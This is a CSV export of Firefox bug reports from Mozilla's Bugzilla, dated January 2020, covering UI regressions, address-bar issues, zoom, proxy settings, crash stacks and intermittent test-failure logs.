1610146,"when window is very narrow, many UI buttons overlap and cannot be used",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: When the window is extremely narrow, many buttons such as bookmarks, page actions (see screenshot) overlap onto one another and they are not unusable. Instead, they should go into the ""More tools"" menu or even the main menu (the old Edge for Windows did this when the window was very narrow). Please see attached screenshot"
1610157,"Default browser, Firefox opens app, does not open actual link",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Firefox is not open. Firefox is set to default browser on MacOSX Catalina 10.15.2 (19C57) Click on a link in a PDF, or document like ppt. Actual results: Link opens Firefox. - but - only firefox opens in the state before it was closed. I still have to go back to the previous application and click the link again to open it. Expected results: Basically firefox is opened, not the link when i click on it."
1610161,"Intermittent leakcheck | tab 1024 bytes leaked (CondVar, Mutex, PRemoteWorkerChild, RemoteWorkerChild, Runnable, ...)",RESOLVED,P5,INCOMPLETE,"**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285530021&repo=try **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/VAAd7QlRQ22Kbg0LJX82rw/runs/0/artifacts/public/logs/live_backing.log --- >[task 2020-01-19T11:23:00.445Z] 11:23:00 INFO - == BloatView: ALL (cumulative) LEAK AND BLOAT STATISTICS, tab process 1375 [task 2020-01-19T11:23:00.445Z] 11:23:00 INFO - [task 2020-01-19T11:23:00.445Z] 11:23:00 INFO - |<----------------Class--------------->|<-----Bytes------>|<----Objects---->| [task 2020-01-19T11:23:00.446Z] 11:23:00 INFO - | | Per-Inst Leaked| Total Rem| [task 2020-01-19T11:23:00.446Z] 11:23:00 INFO - 0 |TOTAL | 47 1024| 16717 16| [task 2020-01-19T11:23:00.446Z] 11:23:00 INFO - 26 |CondVar | 80 80| 54 1| [task 2020-01-19T11:23:00.447Z] 11:23:00 INFO - 103 |Mutex | 72 144| 342 2| [task 2020-01-19T11:23:00.447Z] 11:23:00 INFO - 126 |PRemoteWorkerChild | 96 96| 1 1| [task 2020-01-19T11:23:00.448Z] 11:23:00 INFO - 158 |RemoteWorkerChild | 272 272| 1 1| [task 2020-01-19T11:23:00.448Z] 11:23:00 INFO - 168 |Runnable | 24 48| 432 2| [task 2020-01-19T11:23:00.448Z] 11:23:00 INFO - 210 |ThreadEventT"
1610174,Unable to enter address when migrating from older version,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: My valid, working FireFox is 50.0 (openSUSE 13.2). I installed openSUSE Tumbleweed along with Firefox 72.0.1. When I run it with old .mozilla folder I have peculariar behaviour: * I open new tab * I type an address * I press Enter key * nothing happens Actual results: * Firefox does not respond to Enter key (or Paste&Go action) Expected results: * Firefox should go to the given address When I hit Shift+Enter instead of just Enter -- Firefox opens new window and show the target page correctly. Also when I run Firefox from terminal and pass local file or web page address as an argument -- it also works. For the record my configuration from 50.0 consists of: * 3 disabled add ons * bookmarks * passwords * some customizations like ""open new tab page as the last one""."
1610183,Clipboard actions with Disqus comments are broken,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Enter some text in a Disqus comment box. Copy / paste some text into that same box. Actual results: Unpredictable number of newlines are inserted in and around existing text. New text is pasted to a unpredictable location (sometimes it's where the cursor is, sometimes it's at the start, sometimes the end). Expected results: It should behave like a normal text edit box."
1610198,Dropdown with top sites is displayed when switching with keyboard to an about page,RESOLVED,--,WORKSFORME,"I have two pages open: a website, and about:support. If I switch with the keyboard to the latter (e.g. with cmd+opt+right), the dropdown with top sites is unnecessarily displayed, covering content, and I have to manually dismiss it with ESC. Not sure if this belongs in ::Address Bar or ::Search at this point, given all experiments with the address bar seem to live in the latter."
1610200,Address bar does not autohide after navigating to a new page in fullscreen,VERIFIED,P1,FIXED,"From https://www.reddit.com/r/firefox/comments/eqy7wf/firefox_fullscreen_f11_does_not_auto_hide/ Steps to reproduce: 1. Open Firefox. 2. Open a web page 3. Enter full screen (F11) 4. Use Ctrl-l to open address bar, navigate to any URL What happens: The addressbar does not autohide. Expected result: The address bar should autohide. 12:55.13 INFO: No more inbound revisions, bisection finished. 12:55.13 INFO: Last good revision: 12d4df6de36eaae416b024531d12eb8ee802835c 12:55.13 INFO: First bad revision: 2e388d4237d0473f6e14f4218290d54857be84d6 12:55.13 INFO: Pushlog: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=12d4df6de36eaae416b024531d12eb8ee802835c&tochange=2e388d4237d0473f6e14f4218290d54857be84d6"
1610250,Zoom level badge is displayed in the address bar for default zoom level set to 110%,VERIFIED,P3,FIXED,"#### Affected versions: Nightly 74.0a1 (2020-01-20), Beta 73.0b7 #### Affected platforms: ALL #### Steps: 1. Launch Firefox with a new profile and go to about:preferences. 2. Under General, go to Zoom section and select 110% value from the ""Default zoom"" dropdown. #### Actual result: The zoom level badge is displayed next to the url bar. #### Expected result: The zoom level badge should be not displayed in the URL bar for default zoom level. It is displayed only when the default zoom is set to 110%. For any other value the badge is not displayed."
1610271,"A promise chain failed to handle a rejection: can't access property ""updateCount"", updateManager is undefined - stack: lastBrowserUpdateDate@resource:///modules/UrlbarProviderSearchTips.jsm:415:7",RESOLVED,P1,FIXED,"I updated my checkout, ran a test and encountered an unrelated failure at https://searchfox.org/mozilla-central/rev/803a42f24c8714631ed81cb824ea1c1a803cb7b8/browser/components/urlbar/UrlbarProviderSearchTips.jsm#415 $ ./mach test toolkit/components/extensions/test/browser/browser_ext_themes_dynamic_getCurrent.js Unexpected Results \------------------ toolkit/components/extensions/test/browser/browser_ext_themes_dynamic_getCurrent.js **FAIL A promise chain failed to handle a rejection: can't access property ""updateCount"", updateManager is undefined - stack: lastBrowserUpdateDate@resource:///modules/UrlbarProviderSearchTips.jsm:415:7** _maybeShowTipForUrl@resource:///modules/UrlbarProviderSearchTips.jsm:284:22 onLocationChange@resource:///modules/UrlbarProviderSearchTips.jsm:253:10 onLocationChange@chrome://browser/content/browser.js:5462:32 callListeners@chrome://browser/content/tabbrowser.js:827:31 _callProgressListeners@chrome://browser/content/tabbrowser.js:841:22 updateCurrentBrowser@chrome://browser/content/tabbrowser.js:1069:12 _setupEventListeners/<@chrome://browser/content/tabbrowser.js:5310:16 set selectedIndex@chrome://global/content/elements/tabbox.js:208:14 set selectedP"
1610273,Not in zoom,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Linux; Android 7.1.1; Lenovo TB-X704L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.58 Safari/537.36 Firefox for Android Steps to reproduce: Sites look like not in zoom. Version 685b3. Actual results: Some sites look like in zoom. Proxemitly 120% and I can do nothing (Firefox for android) to solve problem. Please help me."
1610280,Add image not showing all files,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Using Firefox In 'Thunderbird Support Forum' Posting a comment and need to 'Add image'. click on 'Browse' to open window to choose file. Actual results: The file types says 'All supported types' instead of 'All File Types'. 'All supported types' only mentions : '.jfif, .png, .gif' This is particulary annoying because all my images are .jpg and .jpg is perfectly ok for uploading and is supported. AS I offer support, I use the 'Add Images' option to clarification in aiding support. It is seriously irritating beyound belief that everytime I want to add images, I have to reselect that option first just to see the images, so I can make a choice. Expected results: 'All supported types' must include .jpg This is only a recent issue and obviously altered in the last version or so. It is incorrect to allow users to be mislead by what is supported. Please fix this asap."
1610295,Superfluous dots after the toplevel domain are accepted and throw no error,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: Visit URL with typo after the dot com and before slash: https://www.google.cl./preferences (dot com dot slash) Actual results: It navigates the site normally Expected results: It should be regarded as malformed URL unless the web specifications particularly want dots after the TLD and before the slash.
1610298,Preview messages don't belong to a provider,RESOLVED,P1,FIXED,The preview flow is: 1. Add preview provider 2. Update all providers (fetch messages). * this removes the preview provider at the end 3. Fetch messages that match `message.provider === 'preview'` * this would check for `provider.excludes...` but the preview provider was already removed
1610318,"Preferences/Options being opened with subcategories have a ""useless"" back button entry added (e.g. The Manage Settings button from about:protections and the privacy protection entry in the hamburger menu)",RESOLVED,P5,DUPLICATE,"**Affected versions** * 74.0a1 * 73.0b7 * 72.0.2 **Affected platforms** * Windows 10x64 * macOS 10.15 * Ubuntu 16.04x64 **Steps to reproduce** 1. Go to reddit.com 2. Go to the url bar and click on the shield. 3. Go to Show Report option. 4. Click on Manage Settings **Expected result** * A new tab is opened with about:preferences#privacy and the ""Back"" is not enabled. **Actual result** * A new tab is opened with about:preferences#privacy and the ""back"" buttons is enabled. **Regression range** * will return with a regression ASAP. **Additional notes** * The ""back"" button should not be activated , since the section has opened in a new tab. The back button simply refreshes the page and does not redirect to anything."
1610322,I can't connect anymore on Pinterest : the login page is continuously refreshing forbidding me to enter any information,VERIFIED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Go to pinterest, click on login Actual results: It loops between the 2 pages ""Welcome back $My name$"" and ""Welcome on Pinterest"" I can't click anywhere, can't enter my logging/password Expected results: successfully logging on Pinterest (I can properly do it on other browser)"
1610323,The 100% Zoom level badge is displayed when browser.zoom.siteSpecific is turned off,RESOLVED,--,DUPLICATE,"#### Affected versions: Nightly 74.0a1 (2020-01-20), Beta 73.0b7 #### Affected platforms: ALL #### Preconditions: Set the browser.zoom.siteSpecific to false in about:config. #### Steps: 1. Launch Firefox with a new profile and go to about:preferences. 2. Under General, go to Zoom section and select 200% value from the ""Default zoom"" dropdown. 3. Access any website eg. www.reddit.com 4. Click on the 100% zoom level badge displayed in the address bar #### Actual result: The default zoom setting from about:preferences still works. If the siteSpecific preference is disabled and the user reaches a website the 100% badge is displayed in the url bar like its being forced to stay at 100% and when the user clicks the badge it goes back to the global zoom preference set even though the feature is no longer working. #### Expected result: When the site specific is turned off regardless of what we set at the global default zoom the default zoom level should be 100% without displaying the badge, The Badge should not be displayed at 100 percent since its the default zoom level."
1610326,Ubuntu 18.04 Downloads won't open containing folder or run downloads,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Ubuntu 18.04 LTS (tunnels-mlk X55): 1. Download a file 2. Attempt to open the file from the 'Downloads' drop down menu: nothing happens 3. Open 'Show All Downloads'; click 'Open Containing Folder': nothing happens Actual results: Nothing Expected results: For 2. should have opened a dialog box asking me what to do with the downalded file For 3. should have opened the Downloads folder in a Files window
1610342,"Intermittent browser/components/urlbar/tests/browser/browser_urlbar_event_telemetry.js | This test exceeded the timeout threshold. It should be rewritten or split up. If that's not possible, use requestLongerTimeout(N)",RESOLVED,P5,INCOMPLETE,**Filed by:** csabou [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285649058&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/OyGi57gjRKe4K4MUc9kXjw/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/OyGi57gjRKe4K4MUc9kXjw/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 --- task 2020-01-20T16:19:45.096Z] 16:19:45 INFO - TEST-PASS | browser/components/urlbar/tests/browser/browser_urlbar_event_telemetry.js | Should have selected the settings button - true == true - [task 2020-01-20T16:19:45.096Z] 16:19:45 INFO - Buffered messages logged at 16:19:43 [task 2020-01-20T16:19:45.096Z] 16:19:45 INFO - Leaving test bound test [task 2020-01-20T16:19:45.096Z] 16:19:45 INFO - Buffered messages finished [task 2020-01-20T16:19:45.096Z] 16:19:45 INFO - TEST-UNEXPECTED-FAIL | browser/components/urlbar/tests/browser/browser_urlbar_event_telemetry.js | This test exceeded the timeout threshold. It should be rewritten or split u
1610364,Icons scrunch opening extension Feedbro in windowed mode 'save to pocket' and 'bookmark this page',RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Expected results: Icon scrunch opening extension Feedbro only in windowed mode 'save to pocket' and 'bookmark this page'
1610397,Double clicking multiple words in separate search box selects all text instead of the word being double clicked,VERIFIED,P3,FIXED,"From: https://www.reddit.com/r/firefox/comments/erf08d/7201_i_can_no_longer_drag_links_from_the_address/ff3dg9i/ Steps to reproduce: 1. Enable separate search box 2. type two or more words in search box, like ""example example"" 3. Double-click the first ""example"" What happens: Both words are selected. Expected result: Only the first word is selected. 21:33.97 INFO: No more inbound revisions, bisection finished. 21:33.97 INFO: Last good revision: 37fd68a3d10d0ec85350177152ab9af8425f0d3c 21:33.97 INFO: First bad revision: d57c700859fbd63684386e0bf063331460753bc4 21:33.97 INFO: Pushlog: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=37fd68a3d10d0ec85350177152ab9af8425f0d3c&tochange=d57c700859fbd63684386e0bf063331460753bc4"
1610421,Wrong context menu after rearranging tab,NEW,P3,,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I moved a tab to the left I then quickly right clicked it because I intended to close All Tabs To The Right Actual results: I got a limited context menu instead of the full one (See attached file). Expected results: I expected the full context menu to perform my actions.
1610423,"""Also use this proxy for FTP and HTTPS"" grays out SOCKS proxy settings",VERIFIED,P1,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: 1. Go to ""Preferences"" > ""Network Settings"" > ""Settings..."" 2. Check ""Also use this proxy for FTP and HTTPS"" Actual results: ""SOCKS Host"" line is grayed out, with the previous settings filled in. Expected results: ""SOCKS Host"" line is not grayed out."
1610429,Firefox 72.0 does no longer open or link PDF Files,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: updateted firefox Actual results: firefox does no longer send a PDF file to acrobat reader Expected results: klicking on a PDF File link firefox should link it to acrobat reader, start that application and open the pdf file there is no windows update issue as other browsers still work the way as expected with PDF files (chrome, internet explorer)"
1610430,"URL Autosuggestion does not give suggestions until I have typed in ""https://""",RESOLVED,P5,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I have been accustomed to the URL suggesting pages in the following manner If I have visited the site ""https://www.dr.dk"" then when typing in ""d"" in the adress bar, it would suggest the page. Actual results: When I type in ""d"" there is no suggestions. Instead it only starts suggesting the page after I have prefixed with ""https://"" Then I can write ""https://d"" and it suggests the expecting page. Expected results: I should be able to only type in ""d"" in the address bar and then get a suggestion. Note that this happens for all suggestions and not just for the page ""https://www.dr.dk"", it was just used as an example. I am not sure, however, if it has to do with settings on my machine, but I have not been able to find any documentation that could lead me in the right direction as to a fix that I can implement."
1610436,Intermittent [TV] browser/components/urlbar/tests/browser/browser_urlbar_event_telemetry.js | Found a browser window after previous test timed out -,RESOLVED,P5,INCOMPLETE,**Filed by:** apavel [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285706124&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Wk802j1_QI-X9Lv7vTy81g/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Wk802j1_QI-X9Lv7vTy81g/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 --- (4860) | [GFX1-]: Failed to create a valid ShmemTextureHost [task 2020-01-21T01:50:56.164Z] 01:50:56 INFO - GECKO(4860) | ###!!! [Parent][DispatchAsyncMessage] Error: SHMEM_CREATED_MESSAGE Payload error: message could not be deserialized [task 2020-01-21T01:50:56.164Z] 01:50:56 INFO - GECKO(4860) | [GFX1-]: Failed to create a valid ShmemTextureHost [task 2020-01-21T01:50:56.167Z] 01:50:56 INFO - GECKO(4860) | ###!!! [Parent][DispatchAsyncMessage] Error: SHMEM_CREATED_MESSAGE Payload error: message could not be deserialized [task 2020-01-21T01:50:56.167Z] 01:50:56 INFO - GECKO(4860) | [GFX1-]: Failed to create a valid ShmemTextureHos
1610439,Word .docx documents generating unreadable page,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15 Steps to reproduce: Opening or uploadind word .docx documents Actual results: Firefox open the document in an unreadable windows Atempting to change preferences about word documents dosen't resolve the burg Anyway Firefox open this windows .docx nannot be simply uploadeds or opened with microsoft word Expected results: Simply uploading the .docx file in documents folder or opening it with MS words application according with preferences in Firefox menue. Note tis bug is recurrent since at least since 6 months and persiste with new versions"
1610443,Firefox password manager shows none of the saved passwords,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: firefox password manager shows none of the saved passwords"
1610492,Crash in [@ InvalidArrayIndex_CRASH | mozilla::AntiTrackingCommon::RedirectHeuristic],RESOLVED,--,DUPLICATE,"This bug is for crash report bp-45a3e305-d960-42f3-9568-969f40200121. ``` Top 10 frames of crashing thread: 0 xul.dll InvalidArrayIndex_CRASH xpcom/ds/nsTArray.cpp:27 1 xul.dll static mozilla::AntiTrackingCommon::RedirectHeuristic toolkit/components/antitracking/AntiTrackingCommon.cpp:2379 2 xul.dll mozilla::net::nsHttpHandler::AsyncOnChannelRedirect netwerk/protocol/http/nsHttpHandler.cpp:837 3 xul.dll mozilla::net::InterceptedHttpChannel::ResetInterception netwerk/protocol/http/InterceptedHttpChannel.cpp:656 4 xul.dll mozilla::dom::FetchEventOpChild::ResetInterception dom/serviceworkers/FetchEventOpChild.cpp:636 5 xul.dll mozilla::dom::FetchEventOpChild::RecvRespondWith dom/serviceworkers/FetchEventOpChild.cpp:431 6 xul.dll mozilla::dom::PFetchEventOpChild::OnMessageReceived ipc/ipdl/PFetchEventOpChild.cpp:164 7 xul.dll mozilla::ipc::PBackgroundChild::OnMessageReceived ipc/ipdl/PBackgroundChild.cpp:5806 8 xul.dll mozilla::ipc::MessageChannel::DispatchMessage ipc/glue/MessageChannel.cpp:2136 9 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1220 ``` I have no idea what causes it, but as of this morning my nightly randomly crashes on me. It seems to happen sometimes w"
1610497,Address bar can not be selected by mouse if the browser has the minimum width,VERIFIED,P2,FIXED,"**Affected versions** * Fx 74.0a1 * Fx 73.0b7 * Fx 72.0.2 **Affected platforms** * Windows 10 x64 * Ubuntu 18.04 LTS * macOS 10.14 **Steps to reproduce** 1. Launch Firefox. 2. Go to ""https://www.mozilla.org/en-US/contribute/stories/"" . 3. Change the browser width to the minimum. 4. Attempt to select the address bar with the mouse cursor. **Expected result** * The address bar is selected. **Actual result** * The address bar can not be selected. **Regression range** * First bad: 20-09-2020 * Last good: 19-09-2020 * Pushlog: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=b46946d6e446cf50fc2c3fcc62e2cb8ec84c4064&tochange=517c9efa9592ad0c103ec2542e4bc7fcaf06c505 * Potential regressor: 1580538 **Additional notes** * Builds that have the permanent search icon in front of the megabar are not affected (https://bugzil.la/1589836). * This issue is not reproducible if the address bar is set in focus using the keyboard ( Ctrl/Cmd + L)."
1610523,Cannot easily reattempt navigating to a URL that returned status 204 No Content using reload button (and URL is not remembered in session restore),UNCONFIRMED,P5,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: - Open new tab - Open network console - Navigate to a page with status 204 (No Content), for example http://httpstat.us/204 - Try to reload the page with the button near the address bar or F5 or Ctrl+R Actual results: Nothing. Reload button is disabled. Expected results: Firefox should send a new HTTP request. The 204 status is special, but I think if the user explicitly entered the address in the address bar, the browser should navigate to that page and make it possible to reload it. This is a common task (and HTTP status) for developers of web services."
1610623,DisplayMenuBar isn't working via GPO with Firefox 72,VERIFIED,P1,FIXED,"With the changes in bug 1587492, the GPO for the menubar isn't working anymore. This is because the GPO uses 1/0 instead of booleans (implementation detail), so the schema validator change isn't kicking in. This is a corner case where we moved a bool to a string enum, so I'm going to put in a workaround."
1610638,navigator.maxTouchPoints is 10 on a non-touch Windows 10 system,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: just enter 'navigator.maxTouchPoints' in the browser console on a non-touch Windows 10 system Actual results: it reports that 10 touch points are support Expected results: it should report 0 or 1
1610646,"Intermittent browser/components/shell/test/browser_420786.js | Wallpaper position GSettings key is correct - Got zoom, expected scaled",RESOLVED,P5,INCOMPLETE,"**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285826306&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/KkqV5XAqSOWZxqram3O9Gg/runs/0/artifacts/public/logs/live_backing.log --- >[task 2020-01-21T20:37:06.459Z] 20:37:06 INFO - TEST-PASS | browser/components/shell/test/browser_420786.js | Wallpaper position GSettings key is correct - [task 2020-01-21T20:37:06.460Z] 20:37:06 INFO - TEST-PASS | browser/components/shell/test/browser_420786.js | Wallpaper was written to disk - [task 2020-01-21T20:37:06.460Z] 20:37:06 INFO - TEST-PASS | browser/components/shell/test/browser_420786.js | Wallpaper file GSettings key is correct - [task 2020-01-21T20:37:06.460Z] 20:37:06 INFO - Buffered messages finished [task 2020-01-21T20:37:06.462Z] 20:37:06 INFO - TEST-UNEXPECTED-FAIL | browser/components/shell/test/browser_420786.js | Wallpaper position GSettings key is correct - Got zoom, expected scaled [task 2020-01-21T20:37:06.462Z] 20:37:06 INFO - Stack trace: [task 2020-01-21T20:37:06.462Z] 20:37:06 INFO - chrome://mochikit/content/browser-test.js:test_is:1320 [task 2020-01-21T20:37:06.463Z] 20:"
1610654,Intermittent browser/base/content/test/general/browser_bug710878.js | Test timed out -,RESOLVED,P5,INCOMPLETE,**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285835945&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Tq-yjlPVQw2ON9s3x1wyow/runs/0/artifacts/public/logs/live_backing.log --- >[task 2020-01-21T21:23:38.108Z] 21:23:38 INFO - TEST-START | browser/base/content/test/general/browser_bug710878.js [task 2020-01-21T21:25:08.159Z] 21:25:08 INFO - TEST-INFO | started process screentopng [task 2020-01-21T21:25:08.664Z] 21:25:08 INFO - TEST-INFO | screentopng: exit 0 [task 2020-01-21T21:25:08.664Z] 21:25:08 INFO - Buffered messages logged at 21:23:38 [task 2020-01-21T21:25:08.665Z] 21:25:08 INFO - Entering test bound [task 2020-01-21T21:25:08.666Z] 21:25:08 INFO - Buffered messages finished [task 2020-01-21T21:25:08.667Z] 21:25:08 INFO - TEST-UNEXPECTED-FAIL | browser/base/content/test/general/browser_bug710878.js | Test timed out - [task 2020-01-21T21:25:08.668Z] 21:25:08 INFO - GECKO(1410) | MEMORY STAT | vsize 20975444MB | residentFast 1346MB [task 2020-01-21T21:25:08.668Z] 21:25:08 INFO - TEST-OK | browser/base/content/test/general/browser_bug710878.js | took 90058ms [task 2020-01-21T
1610668,"ubuntu1804 - browser/components/sessionstore/test/browser_477657.js | the window remains maximized - Got 3, expected 1",RESOLVED,P5,WORKSFORME,**Filed by:** egao [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285823928&repo=try **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Q4cGcX8RS9-rgQ81TLvRMA/runs/0/artifacts/public/logs/live_backing.log --- suite: mochitest-browser-chrome notes: asan context: [task 2020-01-21T20:18:05.030Z] 20:18:05 INFO - TEST-START | browser/components/sessionstore/test/browser_477657.js [task 2020-01-21T20:18:06.254Z] 20:18:06 INFO - TEST-INFO | started process screentopng [task 2020-01-21T20:18:06.656Z] 20:18:06 INFO - TEST-INFO | screentopng: exit 0 [task 2020-01-21T20:18:06.657Z] 20:18:06 INFO - Buffered messages logged at 20:18:05 [task 2020-01-21T20:18:06.657Z] 20:18:06 INFO - Entering test bound test_sizemodeDefaults [task 2020-01-21T20:18:06.657Z] 20:18:06 INFO - TEST-PASS | browser/components/sessionstore/test/browser_477657.js | window value was set before the window was overwritten - [task 2020-01-21T20:18:06.657Z] 20:18:06 INFO - Buffered messages logged at 20:18:06 [task 2020-01-21T20:18:06.657Z] 20:18:06 INFO - TEST-PASS | browser/components/sessionstore/test/browser_477657.js | window value was implicitly cleared - [
1610681,UrlbarView needs to select the heuristic result when it's not the first result added,RESOLVED,P1,FIXED,"In helping to port interventions, I'm seeing that we end up with an unselected heuristic result. The first result added to the view is the intervention tip, which has a suggestedIndex=1 and is not the heuristic. Later, UnifiedComplete's heuristic result is added. The two results appear in the correct positions, and the first result's `heuristic` property is true. The problem is that the view only selects the heuristic when it is the first result added [1]. That's not the case here, as just described. [1] https://searchfox.org/mozilla-central/rev/cfd1cc461f1efe0d66c2fdc17c024a203d5a2fd8/browser/components/urlbar/UrlbarView.jsm#427"
1610683,Intermittent browser/components/sessionstore/test/browser_async_remove_tab.js | closed tab not saved -,RESOLVED,P5,INCOMPLETE,"**Filed by:** malexandru [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285858624&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/YCDaYATuQACoipxoabYpdw/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-21T23:52:53.011Z] 23:52:53 INFO - TEST-PASS | browser/components/sessionstore/test/browser_async_remove_tab.js | closed tab saved - [task 2020-01-21T23:52:53.011Z] 23:52:53 INFO - Leaving test bound save_worthy_tabs_nonremote [task 2020-01-21T23:52:53.012Z] 23:52:53 INFO - Entering test bound save_worthy_tabs_remote_final [task 2020-01-21T23:52:53.012Z] 23:52:53 INFO - TEST-PASS | browser/components/sessionstore/test/browser_async_remove_tab.js | browser is remote - [task 2020-01-21T23:52:53.012Z] 23:52:53 INFO - Buffered messages logged at 23:52:50 [task 2020-01-21T23:52:53.012Z] 23:52:53 INFO - Console message: SessionStore: [process-switch]: currentRemoteType (web) preferredRemoteType: web [task 2020-01-21T23:52:53.012Z] 23:52:53 INFO - Console message: SessionStore: [process-switch]: web, web, false [task 2020-01-21T23:52:53.012Z] 23:52:53 INFO - Console message: SessionStore: [process"
1610688,Container names on small width resolution hide URL in address bar & ALSO prevent use of installed extensions via Address Bar plugin icons,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Set width of browser to something like 900px wide or less (This small width makes the problem immediately apparent to user) 2. Install Temporary Containers extension & a couple other extensions with extension popup windows (e.g. uBlock Origin and Cookie Auto Delete) Related bug report filed with Temporary Containers extension github issue tracker prior to opening issue on Bugzilla: https://github.com/stoically/temporary-containers/issues/364 Actual results: 1. Container name will be shown & the URL will ALWAYS be hidden on small width display (this is dangerous as user has no idea what domain they are on). 2. If the container name is a long name (e.g. using the extension generated container names when utilizing the ""Deletes History Temporary Containers"" feature of Temporary Containers extension) will cause a display overflow and overlap on the right side of the Address Bar & block the ability to access other installed extension popup windows from the toolbar. Expected results: 1. For user security the URL should have higher visibility priority than container name so the"
1610690,Intermittent browser/components/customizableui/test/browser_923857_customize_mode_event_wrapping_during_reset.js | application crashed [@ __abort_with_payload + 0xa],RESOLVED,--,DUPLICATE,**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285852303&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/DNRiluCjQOeFdxyubn1kbA/runs/0/artifacts/public/logs/live_backing.log --- >[task 2020-01-21T23:30:25.997Z] 23:30:25 INFO - PROCESS-CRASH | browser/components/customizableui/test/browser_923857_customize_mode_event_wrapping_during_reset.js | application crashed [@ __abort_with_payload + 0xa] [task 2020-01-21T23:30:25.997Z] 23:30:25 INFO - Crash dump filename: /var/folders/y7/jbdwtl7n2b35n2s7h0r51ptc000017/T/tmpv9UbTr.mozrunner/minidumps/AC8016CB-0FE5-43A0-B1E6-A37F36B23796.dmp [task 2020-01-21T23:30:25.997Z] 23:30:25 INFO - Operating system: Mac OS X [task 2020-01-21T23:30:25.997Z] 23:30:25 INFO - 10.14.5 18F132 [task 2020-01-21T23:30:25.997Z] 23:30:25 INFO - CPU: amd64 [task 2020-01-21T23:30:25.997Z] 23:30:25 INFO - family 6 model 69 stepping 1 [task 